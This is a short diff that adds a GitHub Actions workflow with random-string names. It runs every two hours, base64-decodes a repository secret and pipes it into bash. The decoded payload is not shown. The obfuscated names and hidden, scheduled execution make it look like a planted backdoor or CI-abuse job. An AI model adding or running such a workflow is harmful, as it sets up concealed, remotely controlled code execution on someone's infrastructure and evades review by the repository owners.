@@ -1,0 +1,13 @@
+name: MBAtcatU
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  lPaMWpcTvW:
+    runs-on: ubuntu-latest
+    env:
+      mPSvnRdrc: ${{ secrets.ghkNDWVg }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.RnDCdFz }}" | base64 -d | bash
